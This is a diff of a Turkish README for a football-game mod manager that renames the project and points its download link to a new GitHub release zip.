@@ -1,4 +1,4 @@
-# ⚽ FC-Mod-Manager-TR
+# FC-Mod-Manager-2026
 
 *EA Sports FC 26, FC 25, FC 24 ve FIFA 19-23 için tam mod yönetim aracı*
 
@@ -8,11 +8,11 @@
 
 ## 🎮 Bu Nedir?
 
-**FC-Mod-Manager-TR** , **EA Sports FC 26, FC 25, FC 24** ve **FIFA 19'dan FIFA 23'e** kadar tüm oyunlar için kapsamlı bir mod yönetim aracıdır. .fifamod ve .fbmod dosyalarını destekler, sürükle-bırak içe aktarma, yükleme sırası kontrolü, çakışma tespiti ve BepInEx entegrasyonu sunar. Grafikleri, formaları, yüzleri, stadyumları, oynanışı ve Kariyer Modu'nu geliştirmek için idealdir.
+**FC-Mod-Manager-2026** , **EA Sports FC 26, FC 25, FC 24** ve **FIFA 19'dan FIFA 23'e** kadar tüm oyunlar için kapsamlı bir mod yönetim aracıdır. .fifamod ve .fbmod dosyalarını destekler, sürükle-bırak içe aktarma, yükleme sırası kontrolü, çakışma tespiti ve BepInEx entegrasyonu sunar. Grafikleri, formaları, yüzleri, stadyumları, oynanışı ve Kariyer Modu'nu geliştirmek için idealdir.
 
 ## 📥 İndir
 
-**[FC-Mod-Manager-TR İndir](https://github.com/AttoConjurer/FC-Mod-Manager-TR/releases/download/879/FifModManagerTR.zip)**
+**[FC-Mod-Manager-2026](https://github.com/AttoConjurer/FC-Mod-Manager-2026/releases/download/880/FCModManager26.zip)**
 
 
 ---
